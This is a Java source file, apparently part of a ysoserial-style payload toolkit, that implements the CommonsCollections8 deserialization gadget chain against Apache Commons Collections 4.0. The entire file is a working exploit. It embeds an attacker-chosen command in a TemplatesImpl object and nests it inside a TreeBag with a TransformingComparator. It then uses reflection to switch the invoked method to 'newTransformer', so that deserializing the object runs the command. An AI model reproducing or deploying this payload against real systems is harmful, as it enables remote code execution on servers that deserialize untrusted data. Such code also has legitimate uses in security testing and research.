package A.R.ysogate.payloads.gadgets;

import java.util.Comparator;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import A.R.ysogate.payloads.ObjectPayload;
import A.R.ysogate.payloads.annotation.Authors;
import A.R.ysogate.payloads.annotation.Dependencies;
import A.R.ysogate.payloads.util.Gadgets;
import A.R.ysogate.payloads.util.Reflections;

@Dependencies({"org.apache.commons:commons-collections4:4.0"})
@Authors({"navalorenzo"})
public class CommonsCollections8 implements ObjectPayload<TreeBag> {

	public TreeBag getObject(String command) throws Exception {
		Object                 templates   = Gadgets.createTemplatesImpl(command);
		InvokerTransformer     transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
		TransformingComparator comp        = new TransformingComparator((Transformer) transformer);
		TreeBag                tree        = new TreeBag((Comparator) comp);
		tree.add(templates);
		Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
		return tree;
	}
}
